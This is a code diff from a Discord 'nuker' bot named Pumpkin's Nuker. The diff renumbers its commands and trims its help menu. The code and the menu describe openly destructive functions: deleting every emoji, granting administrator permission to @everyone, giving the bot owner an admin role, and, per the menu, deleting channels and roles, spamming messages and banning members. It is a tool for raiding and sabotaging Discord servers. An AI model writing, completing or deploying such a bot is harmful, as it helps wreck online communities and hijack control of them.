@@ -239,7 +239,7 @@ async def spam_roles(guild, num_roles, deleted_roles):
 
 
 
-@bot.command(name="6")
+@bot.command(name="5")
 @is_owner()
 @commands.has_permissions(manage_roles=True)
 async def adminall(ctx):
@@ -253,7 +253,7 @@ async def adminall(ctx):
         print("\n", Fore.RED + '[✗]' + Style.RESET_ALL, f'error granting permission to @everyone')
     
 
-@bot.command(name="5")
+@bot.command(name="4")
 @is_owner()
 async def emojidelete(ctx):
   await ctx.message.delete()
@@ -265,7 +265,7 @@ async def emojidelete(ctx):
       print("\n", Fore.RED + '[✗]' + Style.RESET_ALL, f"error deleting emoji {emoji.name}!: {e}")
             
 
-@bot.command(name="4")
+@bot.command(name="3")
 @is_owner()
 async def getadmin(ctx):
     try:
@@ -319,10 +319,9 @@ async def cmd(ctx):
 
     embed.add_field(name='!1', value="change server's name, icon, delete channels, delete roles, create channels, create roles, spam messages ", inline=False)
     embed.add_field(name="!2", value="ban members", inline=False)
-    embed.add_field(name="!3", value="spam messages", inline=False)
-    embed.add_field(name='!4', value='gives an admin role to the owner of the bot', inline=False)
-    embed.add_field(name='!5', value='deletes all emoji in the server', inline=False)
-    embed.add_field(name='!6', value='gives administrator perm to everyone', inline=False)
+    embed.add_field(name='!3', value='give an admin perm to the owner of the bot', inline=False)
+    embed.add_field(name='!4', value='deletes all emoji in the server', inline=False)
+    embed.add_field(name='!5', value='give administrator perm to everyone', inline=False)
     embed.add_field(name="\u200b\nInfo", value=">>> **Pumpkin's Nuker**\nMade by _notpumpkin\nGitHub: https://github.com/kinxyz/Pumpkin", inline=False)
   
     await ctx.author.send(embed=embed)
